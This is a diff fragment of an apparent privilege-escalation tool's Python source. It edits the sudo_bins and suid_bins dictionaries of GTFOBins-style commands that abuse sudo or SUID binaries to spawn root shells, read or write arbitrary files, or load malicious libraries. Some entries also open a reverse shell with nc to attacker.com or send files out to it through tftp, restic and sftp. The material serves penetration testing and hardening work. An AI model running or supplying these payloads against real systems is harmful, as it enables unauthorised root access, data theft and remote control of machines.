-        "TF=$(mktemp -d)\necho 'exec(\"/bin/sh\")' > $TF/x.rb\nsudo FACTERLIB=$TF facter\n"
-    ],
-    "wall": [
-        "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
-    ],
-    "timeout": [
-        "sudo timeout --foreground 7d /bin/sh"
-    ],
-    "taskset": [
-        "sudo taskset 1 /bin/sh"
+    "ar": [
+        "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
+    ],
+    "column": [
+        "LFILE=file_to_read\nsudo column $LFILE\n"
     ],
     "bridge": [
         "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"
     ],
-    "ssh-keyscan": [
-        "LFILE=file_to_read\nsudo ssh-keyscan -f $LFILE\n"
+    "watch": [
+        "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
     ],
-    "nawk": [
-        "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
+    "terraform": [
+        "sudo terraform console\nfile(\"file_to_read\")\n"
     ],
-    "pdb": [
-        "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
-    ],
-    "red": [
-        "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
-    ],
-    "ghc": [
-        "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
-    ],
-    "c89": [
-        "sudo c89 -wrapper /bin/sh,-s ."
-    ],
-    "capsh": [
-        "sudo capsh --"
-    ],
-    "npm": [
-        "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"
-    ],
-    "docker": [
-        "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
-    ],
-    "aws": [
-        "sudo aws help\n!/bin/sh\n"
-    ],
-    "tclsh": [
-        "sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr\n"
-    ],
-    "dash": [
-        "sudo dash"
-    ],
-    "zsh": [
-        "sudo zsh"
-    ],
-    "join": [
-        "LFILE=file_to_read\nsudo join -a 2 /dev/null $LFILE\n"
-    ],
-    "at": [
-        "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
-    ],
-    "vagrant": [
-        "cd $(mktemp -d)\necho 'exec \"/bin/sh\"' > Vagrantfile\nvagrant up\n"
-    ],
-    "su": [
-        "sudo su"
-    ],
-    "w3m": [
-        "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump\n"
-    ],
-    "pexec": [
-        "sudo pexec /bin/sh"
-    ],
-    "top": [
-        "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc\nsudo top\n# press return twice\nreset\n"
-    ],
-    "openvpn": [
-        "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n",
-        "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n"
-    ],
-    "awk": [
-        "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
-    ],
-    "gcloud": [
-        "sudo gcloud help\n!/bin/sh\n"
-    ],
-    "arj": [
-        "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n"
-    ],
-    "cp": [
-        "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n",
-        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
-        "sudo cp /bin/sh /bin/cp\nsudo cp\n"
-    ],
-    "lualatex": [
-        "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
-    ],
-    "luatex": [
-        "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
-    ],
-    "gimp": [
-        "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
-    ],
-    "c99": [
-        "sudo c99 -wrapper /bin/sh,-s ."
-    ],
-    "chroot": [
-        "sudo chroot /\n"
-    ],
-    "xmodmap": [
-        "LFILE=file_to_read\nsudo xmodmap -v $LFILE\n"
-    ],
-    "pandoc": [
-        "LFILE=file_to_write\necho DATA | sudo pandoc -t plain -o \"$LFILE\"\n"
-    ],
-    "perl": [
-        "sudo perl -e 'exec \"/bin/sh\";'"
-    ],
-    "mtr": [
-        "LFILE=file_to_read\nsudo mtr --raw -F \"$LFILE\"\n"
-    ],
-    "sort": [
-        "LFILE=file_to_read\nsudo sort -m \"$LFILE\"\n"
-    ],
-    "man": [
-        "sudo man man\n!/bin/sh\n"
-    ],
-    "cat": [
-        "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
-    ],
-    "tar": [
-        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
-    ],
-    "nft": [
-        "LFILE=file_to_read\nsudo nft -f \"$LFILE\"\n"
+    "pg": [
+        "sudo pg /etc/profile\n!/bin/sh\n"
     ],
     "msgcat": [
         "LFILE=file_to_read\nsudo msgcat -P $LFILE\n"
     ],
-    "aria2c": [
-        "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
+    "openvt": [
+        "COMMAND=id\nTF=$(mktemp -u)\nsudo openvt -- sh -c \"$COMMAND >$TF 2>&1\"\ncat $TF\n"
     ],
-    "sqlmap": [
-        "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\""
+    "ksshell": [
+        "LFILE=file_to_read\nsudo ksshell -i $LFILE\n"
     ],
-    "unzip": [
-        "sudo unzip -K shell.zip\n./sh -p\n"
+    "nasm": [
+        "LFILE=file_to_read\nsudo nasm -@ $LFILE\n"
     ],
-    "shuf": [
-        "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
+    "iftop": [
+        "sudo iftop\n!/bin/sh\n"
     ],
-    "sed": [
-        "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
+    "psql": [
+        "psql\n\\?\n!/bin/sh\n"
     ],
-    "composer": [
-        "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n"
-    ],
-    "yash": [
-        "sudo yash"
-    ],
-    "check_memory": [
-        "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
-    ],
-    "soelim": [
-        "LFILE=file_to_read\nsudo soelim \"$LFILE\"\n"
-    ],
-    "look": [
-        "LFILE=file_to_read\nsudo look '' \"$LFILE\"\n"
-    ],
-    "choom": [
-        "sudo choom -n 0 /bin/sh"
+    "yum": [
+        "sudo yum localinstall -y x-1.0-1.noarch.rpm\n",
+        "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
     ],
     "tmux": [
         "sudo tmux"
     ],
-    "bash": [
-        "sudo bash"
+    "npm": [
+        "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"
     ],
-    "chown": [
-        "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n"
+    "check_raid": [
+        "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n"
     ],
-    "unshare": [
-        "sudo unshare /bin/sh"
+    "vipw": [
+        "sudo vipw"
     ],
-    "ln": [
-        "sudo ln -fs /bin/sh /bin/ln\nsudo ln\n"
+    "check_memory": [
+        "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE\n"
     ],
-    "torsocks": [
-        "sudo torsocks /bin/sh"
+    "tdbtool": [
+        "sudo tdbtool\n! /bin/sh\n"
     ],
-    "readelf": [
-        "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
+    "tmate": [
+        "sudo tmate -c /bin/sh"
     ],
-    "runscript": [
-        "TF=$(mktemp)\necho '! exec /bin/sh' >$TF\nsudo runscript $TF\n"
+    "multitime": [
+        "sudo multitime /bin/sh"
     ],
-    "cut": [
-        "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
+    "shuf": [
+        "LFILE=file_to_write\nsudo shuf -e DATA -o \"$LFILE\"\n"
     ],
-    "snap": [
-        "sudo snap install xxxx_1.0_all.snap --dangerous --devmode\n"
+    "csplit": [
+        "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n"
     ],
-    "mv": [
-        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo mv $TF $LFILE\n"
+    "gawk": [
+        "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
     ],
-    "perlbug": [
-        "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
+    "base58": [
+        "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
     ],
-    "vi": [
-        "sudo vi -c ':!/bin/sh' /dev/null"
+    "node": [
+        "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'\n"
     ],
-    "neofetch": [
-        "TF=$(mktemp)\necho 'exec /bin/sh' >$TF\nsudo neofetch --config $TF\n"
+    "ld.so": [
+        "sudo /lib/ld.so /bin/sh"
     ],
-    "valgrind": [
-        "sudo valgrind /bin/sh"
+    "more": [
+        "TERM= sudo more /etc/profile\n!/bin/sh\n"
     ],
-    "bzip2": [
-        "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
+    "docker": [
+        "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
     ],
-    "latexmk": [
-        "sudo latexmk -e 'exec \"/bin/sh\";'"
+    "cdist": [
+        "sudo cdist shell -s /bin/sh"
     ],
-    "lwp-download": [
-        "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo lwp-download $URL $LFILE\n"
+    "taskset": [
+        "sudo taskset 1 /bin/sh"
     ],
-    "ssh-keygen": [
-        "sudo ssh-keygen -D ./lib.so"
+    "troff": [
+        "LFILE=file_to_read\nsudo troff $LFILE\n"
+    ],
+    "iconv": [
+        "LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\"\n"
     ],
     "crontab": [
         "sudo crontab -e"
@@ -1160,649 +921,885 @@ sudo_bins={
     "basez": [
         "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n"
     ],
-    "wireshark": [
-        "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\"\n"
+    "xelatex": [
+        "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\nstrings article.dvi\n",
+        "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+    ],
+    "wget": [
+        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0\n"
+    ],
+    "rpmdb": [
+        "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
+    ],
+    "cabal": [
+        "sudo cabal exec -- /bin/sh"
+    ],
+    "softlimit": [
+        "sudo softlimit /bin/sh"
+    ],
+    "jjs": [
+        "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
+    ],
+    "csh": [
+        "sudo csh"
+    ],
+    "lualatex": [
+        "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
+    ],
+    "ksu": [
+        "sudo ksu -q -e /bin/sh"
+    ],
+    "flock": [
+        "sudo flock -u / /bin/sh"
+    ],
+    "cmp": [
+        "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n"
+    ],
+    "nc": [
+        "RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT\n"
+    ],
+    "arp": [
+        "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
+    ],
+    "ansible-test": [
+        "sudo ansible-test shell"
+    ],
+    "opkg": [
+        "sudo opkg install x_1.0_all.deb\n"
+    ],
+    "dotnet": [
+        "sudo dotnet fsi\nSystem.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;\n"
+    ],
+    "pexec": [
+        "sudo pexec /bin/sh"
+    ],
+    "setfacl": [
+        "LFILE=file_to_change\nUSER=somebody\nsudo setfacl -m -u:$USER:rwx $LFILE\n"
+    ],
+    "octave": [
+        "sudo octave-cli --eval 'system(\"/bin/sh\")'"
+    ],
+    "readelf": [
+        "LFILE=file_to_read\nsudo readelf -a @$LFILE\n"
+    ],
+    "busctl": [
+        "sudo busctl --show-machine\n!/bin/sh\n"
+    ],
+    "cpan": [
+        "sudo cpan\n! exec '/bin/bash'\n"
+    ],
+    "pdftex": [
+        "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'\n"
+    ],
+    "nroff": [
+        "TF=$(mktemp -d)\necho '#!/bin/sh' > $TF/groff\necho '/bin/sh' >> $TF/groff\nchmod +x $TF/groff\nsudo GROFF_BIN_PATH=$TF nroff\n"
+    ],
+    "python": [
+        "sudo python -c 'import os; os.system(\"/bin/sh\")'"
+    ],
+    "nmap": [
+        "TF=$(mktemp)\necho 'os.execute(\"/bin/sh\")' > $TF\nsudo nmap --script=$TF\n",
+        "sudo nmap --interactive\nnmap> !sh\n"
+    ],
+    "ldconfig": [
+        "TF=$(mktemp -d)\necho \"$TF\" > \"$TF/conf\"\n# move malicious libraries in $TF\nsudo ldconfig -f \"$TF/conf\"\n"
+    ],
+    "clamscan": [
+        "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n"
+    ],
+    "nm": [
+        "LFILE=file_to_read\nsudo nm @$LFILE\n"
+    ],
+    "date": [
+        "LFILE=file_to_read\nsudo date -f $LFILE\n"
+    ],
+    "fping": [
+        "LFILE=file_to_read\nsudo fping -f $LFILE\n"
+    ],
+    "tasksh": [
+        "sudo tasksh\n!/bin/sh\n"
+    ],
+    "msgmerge": [
+        "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n"
+    ],
+    "rvim": [
+        "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+        "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"
+    ],
+    "redcarpet": [
+        "LFILE=file_to_read\nsudo redcarpet \"$LFILE\"\n"
+    ],
+    "aws": [
+        "sudo aws help\n!/bin/sh\n"
+    ],
+    "tee": [
+        "LFILE=file_to_write\necho DATA | sudo tee -a \"$LFILE\"\n"
+    ],
+    "run-mailcap": [
+        "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"
+    ],
+    "pandoc": [
+        "LFILE=file_to_write\necho DATA | sudo pandoc -t plain -o \"$LFILE\"\n"
+    ],
+    "lwp-request": [
+        "LFILE=file_to_read\nsudo lwp-request \"file://$LFILE\"\n"
+    ],
+    "ginsh": [
+        "sudo ginsh\n!/bin/sh\n"
+    ],
+    "apt-get": [
+        "sudo apt-get changelog apt\n!/bin/sh\n",
+        "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n",
+        "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
+    ],
+    "bundler": [
+        "sudo bundler help\n!/bin/sh\n"
+    ],
+    "bzip2": [
+        "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
+    ],
+    "atobm": [
+        "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
+    ],
+    "view": [
+        "sudo view -c ':!/bin/sh'",
+        "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
+        "sudo view -c ':lua os.execute(\"reset; exec sh\")'"
+    ],
+    "cat": [
+        "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
+    ],
+    "xxd": [
+        "LFILE=file_to_read\nsudo xxd \"$LFILE\" | xxd -r\n"
+    ],
+    "exiftool": [
+        "LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT\n"
+    ],
+    "sftp": [
+        "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n"
+    ],
+    "sysctl": [
+        "COMMAND='/bin/sh -c id>/tmp/id'\nsudo sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
+    ],
+    "pdflatex": [
+        "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}'\npdftotext article.pdf -\n",
+        "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+    ],
+    "dig": [
+        "LFILE=file_to_read\nsudo dig -f $LFILE\n"
+    ],
+    "pry": [
+        "sudo pry\nsystem(\"/bin/sh\")\n"
+    ],
+    "cut": [
+        "LFILE=file_to_read\nsudo cut -d \"\" -f1 \"$LFILE\"\n"
+    ],
+    "ssh-keygen": [
+        "sudo ssh-keygen -D ./lib.so"
+    ],
+    "unzip": [
+        "sudo unzip -K shell.zip\n./sh -p\n"
+    ],
+    "setarch": [
+        "sudo setarch $(arch) /bin/sh"
+    ],
+    "pkexec": [
+        "sudo pkexec /bin/sh"
+    ],
+    "timedatectl": [
+        "sudo timedatectl list-timezones\n!/bin/sh\n"
+    ],
+    "pr": [
+        "LFILE=file_to_read\npr -T $LFILE\n"
+    ],
+    "zsh": [
+        "sudo zsh"
+    ],
+    "msgconv": [
+        "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
+    ],
+    "knife": [
+        "sudo knife exec -E 'exec \"/bin/sh\"'\n"
+    ],
+    "timeout": [
+        "sudo timeout --foreground 7d /bin/sh"
+    ],
+    "luatex": [
+        "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
+    ],
+    "ansible-playbook": [
+        "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
+    ],
+    "valgrind": [
+        "sudo valgrind /bin/sh"
+    ],
+    "grc": [
+        "sudo grc --pty /bin/sh"
+    ],
+    "cp": [
+        "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\"\n",
+        "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE\n",
+        "sudo cp /bin/sh /bin/cp\nsudo cp\n"
+    ],
+    "stdbuf": [
+        "sudo stdbuf -i0 /bin/sh"
+    ],
+    "xargs": [
+        "sudo xargs -a /dev/null sh"
+    ],
+    "xpad": [
+        "LFILE=file_to_read\nsudo xpad -f \"$LFILE\"\n"
+    ],
+    "gcore": [
+        "sudo gcore $PID"
+    ],
+    "dpkg": [
+        "sudo dpkg -l\n!/bin/sh\n",
+        "sudo dpkg -i x_1.0_all.deb"
+    ],
+    "uudecode": [
+        "LFILE=file_to_read\nsudo uuencode \"$LFILE\" /dev/stdout | uudecode\n"
+    ],
+    "update-alternatives": [
+        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\nsudo update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
     ]
 }
 # SUDO_BINS_END
 
 # SUID_BINS_START
 suid_bins={
-    "head": [
-        "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
-    ],
-    "systemctl": [
-        "TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF\n"
-    ],
-    "arp": [
-        "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
-    ],
-    "vigr": [
-        "./vigr"
-    ],
-    "cmp": [
-        "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n"
-    ],
-    "ash": [
-        "./ash"
-    ],
-    "cupsfilter": [
-        "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n"
-    ],
-    "sshpass": [
-        "./sshpass /bin/sh -p"
-    ],
-    "aa-exec": [
-        "./aa-exec /bin/sh -p"
-    ],
-    "nm": [
-        "LFILE=file_to_read\n./nm @$LFILE\n"
-    ],
-    "cpulimit": [
-        "./cpulimit -l 100 -f -- /bin/sh -p"
-    ],
-    "ip": [
-        "LFILE=file_to_read\n./ip -force -batch \"$LFILE\"\n",
-        "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo\n"
+    "tail": [
+        "LFILE=file_to_read\n./tail -c1G \"$LFILE\"\n"
     ],
     "ascii-xfr": [
         "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n"
     ],
-    "vimdiff": [
-        "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
-    ],
-    "flock": [
-        "./flock -u / /bin/sh -p"
-    ],
-    "find": [
-        "./find . -exec /bin/sh -p \\; -quit"
-    ],
-    "gdb": [
-        "./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"
-    ],
-    "make": [
-        "COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\"\n"
-    ],
-    "diff": [
-        "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n"
-    ],
-    "minicom": [
-        "./minicom -D /dev/null\n"
-    ],
-    "ksshell": [
-        "LFILE=file_to_read\n./ksshell -i $LFILE\n"
-    ],
-    "ar": [
-        "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
-    ],
-    "ss": [
-        "LFILE=file_to_read\n./ss -a -F $LFILE\n"
-    ],
-    "tftp": [
-        "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
-    ],
-    "nice": [
-        "./nice /bin/sh -p"
-    ],
-    "vim": [
-        "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
-    ],
-    "python": [
-        "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
-    ],
-    "update-alternatives": [
-        "LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
-    ],
-    "softlimit": [
-        "./softlimit /bin/sh -p"
-    ],
-    "nmap": [
-        "LFILE=file_to_write\n./nmap -oG=$LFILE DATA\n"
-    ],
-    "more": [
-        "./more file_to_read"
-    ],
-    "ptx": [
-        "LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\"\n"
-    ],
-    "ionice": [
-        "./ionice /bin/sh -p"
+    "efax": [
+        "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
     ],
     "as": [
         "LFILE=file_to_read\n./as @$LFILE\n"
     ],
-    "emacs": [
-        "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"
+    "uuencode": [
+        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
     ],
-    "vipw": [
-        "./vipw"
+    "chown": [
+        "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n"
     ],
-    "sash": [
-        "./sash"
-    ],
-    "jq": [
-        "LFILE=file_to_read\n./jq -Rr . \"$LFILE\"\n"
-    ],
-    "nasm": [
-        "LFILE=file_to_read\n./nasm -@ $LFILE\n"
-    ],
-    "uniq": [
-        "LFILE=file_to_read\n./uniq \"$LFILE\"\n"
-    ],
-    "busybox": [
-        "./busybox sh"
-    ],
-    "unsquashfs": [
-        "./unsquashfs shell\n./squashfs-root/sh -p\n"
-    ],
-    "pr": [
-        "LFILE=file_to_read\npr -T $LFILE\n"
-    ],
-    "msguniq": [
-        "LFILE=file_to_read\n./msguniq -P $LFILE\n"
-    ],
-    "view": [
-        "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
-    ],
-    "tbl": [
-        "LFILE=file_to_read\n./tbl $LFILE\n"
-    ],
-    "cpio": [
-        "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"\n",
-        "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n"
-    ],
-    "nl": [
-        "LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE\n"
-    ],
-    "rtorrent": [
-        "echo \"execute = /bin/sh,-p,-c,\\\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\\\"\" >~/.rtorrent.rc\n./rtorrent\n"
-    ],
-    "rview": [
-        "./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
-    ],
-    "alpine": [
-        "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
-    ],
-    "file": [
-        "LFILE=file_to_read\n./file -f $LFILE\n"
-    ],
-    "dig": [
-        "LFILE=file_to_read\n./dig -f $LFILE\n"
-    ],
-    "gawk": [
-        "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n"
-    ],
-    "xargs": [
-        "./xargs -a /dev/null sh -p"
-    ],
-    "expand": [
-        "LFILE=file_to_read\n./expand \"$LFILE\"\n"
-    ],
-    "strings": [
-        "LFILE=file_to_read\n./strings \"$LFILE\"\n"
-    ],
-    "restic": [
-        "RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\"\n"
-    ],
-    "setfacl": [
-        "LFILE=file_to_change\nUSER=somebody\n./setfacl -m u:$USER:rwx $LFILE\n"
-    ],
-    "xxd": [
-        "LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r\n"
-    ],
-    "efax": [
-        "LFILE=file_to_read\n./efax -d \"$LFILE\"\n"
-    ],
-    "eqn": [
-        "LFILE=file_to_read\n./eqn \"$LFILE\"\n"
-    ],
-    "fish": [
-        "./fish"
-    ],
-    "ksh": [
-        "./ksh -p"
-    ],
-    "ld.so": [
-        "./ld.so /bin/sh -p"
-    ],
-    "atobm": [
-        "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
-    ],
-    "date": [
-        "LFILE=file_to_read\n./date -f $LFILE\n"
-    ],
-    "mosquitto": [
-        "LFILE=file_to_read\n./mosquitto -c \"$LFILE\"\n"
-    ],
-    "tac": [
-        "LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\"\n"
-    ],
-    "wget": [
-        "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0\n"
-    ],
-    "start-stop-daemon": [
-        "./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
-    ],
-    "whiptail": [
-        "LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
-    ],
-    "gcore": [
-        "./gcore $PID"
-    ],
-    "aspell": [
-        "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
-    ],
-    "kubectl": [
-        "LFILE=dir_to_serve\n./kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/\n"
-    ],
-    "column": [
-        "LFILE=file_to_read\n./column $LFILE\n"
-    ],
-    "gtester": [
-        "TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF\n"
+    "nice": [
+        "./nice /bin/sh -p"
     ],
     "fold": [
         "LFILE=file_to_read\n./fold -w99999999 \"$LFILE\"\n"
     ],
-    "less": [
-        "./less file_to_read"
-    ],
-    "jrunscript": [
-        "./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""
-    ],
-    "run-parts": [
-        "./run-parts --new-session --regex '^sh$' /bin --arg='-p'"
-    ],
-    "rvim": [
-        "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
-    ],
-    "uudecode": [
-        "LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode\n"
-    ],
-    "sysctl": [
-        "COMMAND='/bin/sh -c id>/tmp/id'\n./sysctl \"kernel.core_pattern=|$COMMAND\"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\n"
-    ],
-    "csvtool": [
